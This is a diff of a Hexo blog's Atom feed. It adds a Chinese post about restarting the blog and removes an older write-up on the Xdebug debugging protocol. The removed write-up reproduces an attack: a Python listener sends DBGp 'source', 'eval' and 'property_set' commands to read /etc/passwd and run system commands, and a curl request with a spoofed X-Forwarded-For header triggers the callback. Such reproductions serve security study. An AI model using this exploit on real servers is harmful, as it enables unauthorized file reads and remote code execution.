@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2019-12-21T14:40:23.418Z</updated>
+  <updated>2019-12-22T02:55:27.291Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>博客重启小记</title>
+    <link href="http://yoursite.com/2019/12/22/%E5%8D%9A%E5%AE%A2%E9%87%8D%E5%90%AF%E5%B0%8F%E8%AE%B0/"/>
+    <id>http://yoursite.com/2019/12/22/%E5%8D%9A%E5%AE%A2%E9%87%8D%E5%90%AF%E5%B0%8F%E8%AE%B0/</id>
+    <published>2019-12-22T02:27:51.000Z</published>
+    <updated>2019-12-22T02:55:27.291Z</updated>
+    
+    <content type="html"><![CDATA[<p>大约是在一七年那个寒假开始写技术博客，中间断断续续的更新到一八年六月。重新写博客是起于今年九月份的临时起意，一方面是想督促自己“有意识”的进步，另外一方面是假装做做技术输出。最开始博客用的是hexo，重启之后另起炉灶用是wordpress，因为并不想付云服务器月租所以决定换回hexo。在弃更到重启这段期间因为换过新笔记本并且再加上没有备份，所以之前的博客文章的md版已经灾难性的消失。大约花了一天多的时间慢慢把网页手工恢复成符合hexo格式的md（大概部分文章仍然会有格式上的错误），在整理的时候发现自己以前的文章表意不清，部分地方是片面甚至错误的（以后抽时间慢慢改，咕咕咕？）。以上～</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;大约是在一七年那个寒假开始写技术博客，中间断断续续的更新到一八年六月。重新写博客是起于今年九月份的临时起意，一方面是想督促自己“有意识”的进步，另外一方面是假装做做技术输出。最开始博客用的是hexo，重启之后另起炉灶用是wordpress，因为并不想付云服务器月租所以决定换回hexo。在弃更到重启这段期间因为换过新笔记本并且再加上没有备份，所以之前的博客文章的md版已经灾难性的消失。大约花了一天多的时间慢慢把网页手工恢复成符合hexo格式的md（大概部分文章仍然会有格式上的错误），在整理的时候发现自己以前的文章表意不清，部分地方是片面甚至错误的（以后抽时间慢慢改，咕咕咕？）。以上～&lt;/p&gt;
+
+    
+    </summary>
+    
+    
+    
+      <category term="杂" scheme="http://yoursite.com/tags/%E6%9D%82/"/>
+    
+  </entry>
   
   <entry>
     <title>Using Java&#39;s SSRF vulnerability rce via ntlm relay</title>
@@ -449,29 +471,6 @@
     
     
       <category term="php security" scheme="http://yoursite.com/categories/php-security/"/>
-    
-    
-      <category term="php" scheme="http://yoursite.com/tags/php/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Xdebug原理学习及其攻击面复现</title>
-    <link href="http://yoursite.com/2017/09/27/Xdebug%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%94%BB%E5%87%BB%E9%9D%A2%E5%A4%8D%E7%8E%B0/"/>
-    <id>http://yoursite.com/2017/09/27/Xdebug%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%94%BB%E5%87%BB%E9%9D%A2%E5%A4%8D%E7%8E%B0/</id>
-    <published>2017-09-26T16:00:00.000Z</published>
-    <updated>2019-12-21T11:42:30.242Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="通信过程"><a href="#通信过程" class="headerlink" title="通信过程"></a>通信过程</h2><p>Xdebug的工作原理可以总结为下面几个步骤</p><ol><li><p>IDE中已经集成了一个遵循BGDp的Xdebug插件。当要debug的时候，点击一些IDE的某个按钮，启动这个插件。该插件会启动一个9000的端口监听远程服务器发过来的debug信息。其中BGDp是客户端和服务端的通信协议</p></li><li><p>浏览器向Httpd服务器发送一个带有XDEBUG_SESSION_START参数的请求，Httpd收到这个请求之后交给后端的PHP进行处理</p></li><li><p>Php（有Xdebug的拓展）看到这个请求是带了XDEBUG_SESSION_START 参数，就告诉Xdebug，“嘿，我要debug喔，你准备一下”。这时，Xdebug这时会向来源ip客户端的9000端口（IDE监听）发送一个debug请求，然后客户端的9000端口响应这个请求，那么debug就开始了。</p></li><li><p>Php知道Xdebug已经准备好了，那么就开始开始一行一行的执行代码，但是每执行一行都会让Xdebug过滤一下。</p></li><li><p>Xdebug开始过滤代码，Xdebug在过滤每一行代码的时候，都会暂停代码的执行，然后向客户端的9000端口发送该行代码的执行情况，等待客户端的决策。</p></li><li><p>相应，客户端（IDE）收到Xdebug发送过来的执行情况，就可以把这些信息展示给开发者看了，包括一些变量的值等。同时向Xdebug发送下一步应该什么。</p></li></ol><p>实际过程中的抓包如图<br><img src="1.png" alt="1.png"></p><p>当链接建立成功的时候php端会[PSH，ACK]</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="iso-8859-1"?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">init</span> <span class="attr">xmlns</span>=<span class="string">"urn:debugger_protocol_v1"</span> <span class="attr">xmlns:xdebug</span>=<span class="string">"http://xdebug.org/dbgp/xdebug"</span> <span class="attr">fileuri</span>=<span class="string">"file:///var/www/html/test1.php"</span> <span class="attr">language</span>=<span class="string">"PHP"</span> <span class="attr">xdebug:language_version</span>=<span class="string">"7.0.22-2"</span> <span class="attr">protocol_version</span>=<span class="string">"1.0"</span> <span class="attr">appid</span>=<span class="string">"2000"</span> <span class="attr">idekey</span>=<span class="string">"phpstorm"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">engine</span> <span class="attr">version</span>=<span class="string">"2.5.5"</span>&gt;</span></span><br><span class="line">        &lt;![CDATA[Xdebug]]&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">engine</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">author</span>&gt;</span></span><br><span class="line">        &lt;![CDATA[Derick Rethans]]&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url</span>&gt;</span></span><br><span class="line">        &lt;![CDATA[http://xdebug.org]]&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">copyright</span>&gt;</span></span><br><span class="line">        &lt;![CDATA[Copyright (c) 2002-2017 by Derick Rethans]]&gt;</span><br><span class="line"><span class="tag">&lt;/<span class="name">copyright</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">init</span>&gt;</span></span><br></pre></td></tr></table></figure><p>需要注意的在调试过程中有输出，并不会立即出现在网页上，待全部调试结束后才会输出到网页中，调试的之前你需要确保你已经配置好了xdebug扩展(php.ini)。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>攻击思路来自<a href="https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface" target="_blank" rel="noopener">初心を忘れず</a></p><p>这里将文中提到的姿势进行复现,偷一波脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">ip_port = (<span class="string">'0.0.0.0'</span>,<span class="number">9000</span>)</span><br><span class="line">sk = socket.socket()</span><br><span class="line">sk.bind(ip_port)</span><br><span class="line">sk.listen(<span class="number">10</span>)</span><br><span class="line">conn, addr = sk.accept()</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    client_data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">    print(client_data)</span><br><span class="line">    data = raw_input(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#读文件</span></span><br><span class="line">    conn.sendall(<span class="string">'source -i 1 -f %s\x00'</span> % data)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#执行命令</span></span><br><span class="line">    <span class="comment">#conn.sendall('eval -i 1 -- %s\x00' % data.encode('base64'))</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#执行命令2</span></span><br><span class="line">    <span class="comment">#conn.sendall('property_set -n $a -i 1 -c 1 -- %s\x00' % data.encode('base64'))</span></span><br></pre></td></tr></table></figure><p>触发漏洞</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">'http://192.168.169.88/test1.php?XDEBUG_SESSION_START=phpstorm'</span> -H <span class="string">"X-Forwarded-For: 192.168.169.36"</span></span><br></pre></td></tr></table></figure><h3 id="source"><a href="#source" class="headerlink" title="source"></a>source</h3><p>file:///etc/passwd<br><img src="2.png" alt=""></p><h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><p>system(“id”);<br><img src="3.png" alt=""></p><h3 id="property-set"><a href="#property-set" class="headerlink" title="property_set"></a>property_set</h3><p>system(“id”);<br><img src="6.png" alt=""></p><p>退出后可以看到<br><img src="7.png" alt=""></p><p>尝试写shell失败（test是777），忽然想到可以base64。<br><img src="8.png" alt=""></p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>利用条件是要xdebug.remote_connect_back开启</p><p>在文档是这样描述的：<br>xdebug.remote_connect_back<br>类型: boolean, 默认值: 0, 始于 Xdebug &gt; 2.1</p><p>如果设置生效， xdebug.remote_host 设置会忽略而Xdebug会尝试给制造HTTP请求的客户端进行连接。它会检查$_SERVER[‘REMOTE_ADDR’] 变量并找出使用的IP地址。请记住它没有有效的过滤，任何人都能启动调试会话连接到服务器，即使他们的地址并不匹配 xdebug.remote_host.</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://my.oschina.net/atanl/blog/371424?fromerr=FV9ksMPu" target="_blank" rel="noopener">Xdebug工作原理</a></p>]]></content>
-    
-    <summary type="html">
-    
-      攻击思路来自 rr师傅，记得那年师傅的博客叫初心を忘れず
-    
-    </summary>
-    
-    
-      <category term="web security" scheme="http://yoursite.com/categories/web-security/"/>
     
     
       <category term="php" scheme="http://yoursite.com/tags/php/"/>
